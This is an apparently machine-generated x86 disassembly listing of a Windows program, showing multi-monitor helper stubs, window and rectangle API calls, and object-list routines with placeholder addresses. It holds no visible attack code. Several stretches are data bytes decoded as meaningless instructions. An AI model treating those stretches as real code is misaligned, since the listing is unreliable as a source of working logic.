lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_429994
sub_429aba
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_429824
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_429b3b
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_429824
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_429c28
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_429824
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_429cfc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_429824
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_429dd0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_429824
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_429f6b
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_429f91
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429f98
retn
sub_429fac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429fd1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429fd8
retn
sub_42a0cc
unpckhps xmm1 [ ecx + 0x53 ]
jae r-xdata
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
lea eax [ eax ]
mov [ ecx + 0x42 ] fs
add [ eax ] al
shl [ eax + 0x40 ] 0x1
add bh bh
dec [ ebp - 0x5e73ffc0 ]
inc edx
add [ eax ] al
add [ eax ] al
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
push esi
je r-xdata
lodsd [ esi ]
mov al [ 0x66010042 ]
xchg ebx eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0xc0042 ] cl
outsb
je r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add al dl
jo r-xdata
jae r-xdata
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
nop
mov al [ 0x130f0042 ]
dec ecx
inc ebp
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
mov eax [ 0xc0f0042 ]
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add al dh
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x42a10cc0 ]
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42ad77
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
int3
mov eax eax
imul ebp [ edi + 0x6e ] 0xf000408d
mov eax [ 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
or al 0x49
inc edx
outsb
dec eax
insb
jns r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
mov eax [ 0xc0042 ]
popad
outsb
popad
jb r-xdata
add al al
dec edi
jae r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_40405c
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
imul esp [ ebp + 0x77 ] 0xa0507265
inc edx
add [ ecx ] al
xchg bx ax
jo r-xdata
insb
je r-xdata
add [ edi ] cl
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ecx + 0xc0042 ] fs
add [ ecx + 0x42 ] cl
jns r-xdata
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jo r-xdata
mov al [ 0x150f0042 ]
dec ecx
push ebx
add bh bh
dec esp
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
jmp r-xdata
js r-xdata
adc ecx [ ecx + 0x45 ]
insd
and al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0xa08c7265
inc edx
add [ ecx ] al
xchg bx ax
cld
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
inc eax
outsb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ad7e
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a84
lea eax [ ebp - 0x8 ]
call sub_405874
retn
inc ebx
xor edi edi
jo r-xdata
cmp cl [ ecx ]
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x42a090c0 ]
add [ edi ] cl
jae r-xdata
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058b8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
and al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
outsb
je r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_429454
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40588c
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058b8
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429fd8
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jns r-xdata
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
call [ eax + 0x42 ]
lodsd [ esi ]
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
imul esp [ ebp + 0x77 ] 0x11247265
inc eax
add [ ecx ] al
xchg ebx eax
cld
jae r-xdata
adc eax 0x65705349
je r-xdata
dec [ ebx + 0x42a020c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
insd
dec eax
insb
jo r-xdata
sub_42a144
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ecx + 0xc0042 ] fs
add [ eax ] al
shl [ eax + 0x40 ] 0x1
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
push esi
je r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42ad77
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
int3
mov eax eax
imul ebp [ edi + 0x6e ] 0xf000408d
mov eax [ 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_40405c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ad7e
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a84
lea eax [ ebp - 0x8 ]
call sub_405874
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058b8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_429454
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40588c
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058b8
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42a1b1
mov eax [ 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah [ edx + 0xc0042 ]
add [ eax ] al
mov al 0x10
inc eax
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x60 ] dl
inc edx
add [ eax + eax ] al
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
int3
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42ad77
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_40405c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ad7e
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a84
lea eax [ ebp - 0x8 ]
call sub_405874
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058b8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_429454
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40588c
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058b8
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42a3a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42a41e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_42a534
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40588c
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a425
lea eax [ ebp - 0x8 ]
call sub_405874
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a4c0
mov [ rw-data ] eax
sub_42a42c
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a4c0
mov [ rw-data ] eax
mov ecx r-xdata
call sub_4058b8
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42a484
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40588c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_42a4c0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_404008
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_42a534
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42a635
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a484
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_429468
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_405874
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d080
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405874
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d080
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a484
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_429468
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a484
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_429468
mov ecx r-xdata
call sub_4058b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a63c
lea eax [ ebp - 0xc ]
call sub_405874
lea eax [ ebp - 0x8 ]
call sub_405874
retn
sub edx 0xfffffff8
sub_42a654
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_429454
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42a694
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_429454
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42a6c4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42a856
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_429454
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a7f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a85d
lea eax [ ebp - 0x10 ]
call sub_404008
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_429454
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
mov eax esi
xor edx edx
call sub_429454
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_429454
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403290
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_429454
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42a864
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42a949
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_40405c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a950
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a84
lea eax [ ebp - 0x8 ]
call sub_405874
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_429454
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40588c
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058b8
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_429454
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40588c
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058b8
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
